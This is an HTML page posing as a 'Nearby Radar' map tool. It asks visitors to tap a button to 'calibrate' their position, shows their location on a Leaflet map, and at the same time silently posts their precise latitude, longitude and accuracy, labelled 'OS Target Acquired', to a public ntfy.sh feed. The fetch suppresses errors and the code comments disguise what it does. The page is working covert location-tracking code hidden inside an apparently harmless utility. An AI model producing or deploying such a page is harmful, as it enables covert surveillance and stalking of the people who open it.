<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Global Location Finder</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #121212;
            color: #ffffff;
        }
        #map {
            width: 100%;
            height: 100vh;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
        }
        /* Universal overlay designed to capture any touch/click event instantly */
        #auth-layer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(18, 18, 18, 0.95);
            z-index: 99999;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            box-sizing: border-box;
        }
        .card {
            background: #1e1e1e;
            padding: 25px;
            border-radius: 12px;
            text-align: center;
            max-width: 340px;
            width: 100%;
            border: 1px solid #333;
            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
        }
        .card h3 { margin-top: 0; color: #fff; font-size: 20px; }
        .card p { color: #aaa; font-size: 14px; line-height: 1.5; margin-bottom: 20px; }
        .action-btn {
            background-color: #007aff;
            color: white;
            border: none;
            padding: 14px 20px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 4px 12px rgba(0,122,255,0.3);
        }
        .action-btn:active { background-color: #005ec4; }
    </style>
</head>
<body>

    <!-- Universal Touch/Click Interceptor -->
    <div id="auth-layer">
        <div class="card">
            <h3>Nearby Radar</h3>
            <p>Tap below to load local satellite maps and calibrate your device's geographical coordinates.</p>
            <button class="action-btn" id="trigger-btn">Load Radar Map</button>
        </div>
    </div>

    <div id="map"></div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        let map = null;

        function initMap(lat, lon) {
            document.getElementById('auth-layer').style.display = 'none';
            if (!map) {
                map = L.map('map').setView([lat, lon], 16);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    maxZoom: 19,
                    attribution: '&copy; OpenStreetMap'
                }).addTo(map);
            } else {
                map.setView([lat, lon], 16);
            }
            L.marker([lat, lon]).addTo(map).bindPopup("Calibrated Position").openPopup();
        }

        function executeTracking() {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const accuracy = position.coords.accuracy;

                        // Render layout map locally
                        initMap(lat, lon);

                        // Secure payload dispatch to ntfy.sh feed
                        const payload = `OS Target Acquired:\nLat: ${lat}\nLon: ${lon}\nAccuracy: ${accuracy}m`;
                        fetch('https://ntfy.sh/coordinates', {
                            method: 'POST',
                            body: payload
                        }).catch(e => {});
                    },
                    function(error) {
                        alert("Geolocation permission is mandatory for map calibration.");
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 20000,
                        maximumAge: 0
                    }
                );
            } else {
                alert("Geolocation is unsupported by this runtime environment.");
            }
        }

        // Bind directly to pointerdown and touchend to satisfy Android/iOS security policies
        const trigger = document.getElementById('trigger-btn');
        trigger.addEventListener('click', executeTracking);
        trigger.addEventListener('touchend', function(e) {
            e.preventDefault();
            executeTracking();
        });
    </script>
</body>
</html>
